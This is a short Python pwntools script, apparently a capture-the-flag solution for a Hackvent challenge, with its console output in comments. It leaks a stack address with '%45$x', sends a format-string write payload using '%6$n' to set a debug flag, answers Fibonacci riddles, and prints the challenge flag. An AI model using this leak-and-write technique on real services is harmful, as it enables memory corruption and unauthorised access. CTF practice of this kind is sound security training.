from pwn import *

def fib(n, c={0:1, 1:1}):
    if n not in c:
        x = n // 2
        c[n] = fib(x-1) * fib(n-x-1) + fib(x) * fib(n - x)
    return c[n]
for i in xrange(15):
	print fib(i),",",
#s = remote('127.0.0.1',8888)
s = remote('challenges.hackvent.hacking-lab.com',8888)
print s.recvline()
print s.recvline()
s.send("%45$x\n")
leak=s.recvline()
print leak
debug_mode=int(leak.strip().split(':')[1],16)-0x64
print hex(debug_mode)
payload="AAAA"+p32(debug_mode)+"%6$n\n"
print repr(payload)
s.send(payload)
s.interactive()


# sudhakar@Hack-Machine:/tmp$ python untitled.py 
# 1 , 1 , 2 , 3 , 5 , 8 , 13 , 21 , 34 , 55 , 89 , 144 , 233 , 377 , 610 ,[+] Opening connection to challenges.hackvent.hacking-lab.com on port 8888: Done
#  Riddle me this, riddle me that. What about solving a bunch of riddles for a present or two?

# 0, 1, 1, 2, 3 ... ?

# parse error: ff9896d8

# 0xff989674
# 'AAAAt\x96\x98\xff%6$n\n'
# [*] Switching to interactive mode
# parse error: AAAAt\x96\x98\xff
# $ 5
# ACK, go ahead...
# $ 8
# ACK, go ahead...
# $ 13
# ACK, go ahead...
# $ 21
# ACK, go ahead...
# $ 34
# ACK, go ahead...
# $ 55
# ACK, go ahead...
# $ 89
# ACK, go ahead...
# $ 144
# ACK, go ahead...
# $ 233
# ACK, go ahead...
# $ 377
# ACK, go ahead...
# Debug mode: 10 riddles solved ==> 'HV15-ywKu-2X9f-LBqr-NVFK-THF6'
# [*] Got EOF while reading in interactive
# $  
